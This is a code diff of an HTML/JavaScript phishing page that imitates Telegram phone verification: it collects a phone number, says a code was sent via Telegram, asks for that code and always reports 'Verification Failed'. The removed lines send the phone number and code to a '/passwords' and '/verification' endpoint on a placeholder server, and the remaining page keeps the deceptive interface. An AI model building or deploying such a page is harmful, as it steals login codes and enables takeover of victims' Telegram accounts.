@@ -303,7 +303,6 @@
     </div>
 
     <div class="container" id="phoneVerificationContainer" style="display:none;">
-    
         <h1 id="phoneDisplay"></h1>
         <p>We have sent you a message in Telegram with the code.</p>
 
@@ -312,12 +311,12 @@
             <input type="tel" id="verificationCode" inputmode="numeric" pattern="[0-9]*" placeholder="Code">
         </div>
 
-        <button class="button" onclick="submitVerification()">Submit</button>
+        <button class="button" onclick="showFinalMessage()">Submit</button>
     </div>
 
     <div class="container" id="finalMessageContainer" style="display:none;">
         <h1>Verification Failed</h1>
-        <p id="finalMessage"></p>
+        <p id="finalMessage">Your verification code was incorrect. Please try again.</p>
         <button class="button" onclick="resetForm()">Try Again</button>
     </div>
 
@@ -366,70 +365,20 @@
             }
 
             document.getElementById('nextButton').addEventListener('click', function() {
-                const phoneNumber = phoneNumberInput.value;
+                const phoneNumber = phoneNumberInput.value.trim();
                 if (phoneNumber === '') {
                     alert('Please enter your phone number.');
                     return;
                 }
 
-                // Send phone number to the server
-                fetch('https://192.168.x.x:5001/passwords', {  // Use your local IP address
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({ phone: phoneNumber }),
-                })
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error('Failed to send phone number');
-                    }
-                    return response.json();
-                })
-                .then(data => {
-                    console.log('Phone number sent:', data);
-                    document.getElementById('phoneDisplay').textContent = phoneNumber;
-                    document.getElementById('initialContainer').style.display = 'none';
-                    document.getElementById('phoneVerificationContainer').style.display = 'block';
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                    alert('An error occurred while sending your phone number. Please try again.');
-                });
+                document.getElementById('phoneDisplay').textContent = phoneNumber;
+                document.getElementById('initialContainer').style.display = 'none';
+                document.getElementById('phoneVerificationContainer').style.display = 'block';
             });
 
-            window.submitVerification = function() {
-                const verificationCode = document.getElementById('verificationCode').value;
-                const phoneNumber = phoneNumberInput.value;
-
-                if (verificationCode === '') {
-                    alert('Please enter the verification code.');
-                    return;
-                }
-
-                // Send verification code to the server
-                fetch('http://192.168.x.x:5001/verification', {  // Use your local IP address
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({ phone: phoneNumber, code: verificationCode }),
-                })
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error('Failed to send verification code');
-                    }
-                    return response.json();
-                })
-                .then(data => {
-                    console.log('Verification code sent:', data);
-                    document.getElementById('phoneVerificationContainer').style.display = 'none';
-                    document.getElementById('finalMessageContainer').style.display = 'block';
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                    alert('An error occurred while sending your verification code. Please try again.');
-                });
+            window.showFinalMessage = function() {
+                document.getElementById('phoneVerificationContainer').style.display = 'none';
+                document.getElementById('finalMessageContainer').style.display = 'block';
             };
 
             window.resetForm = function() {
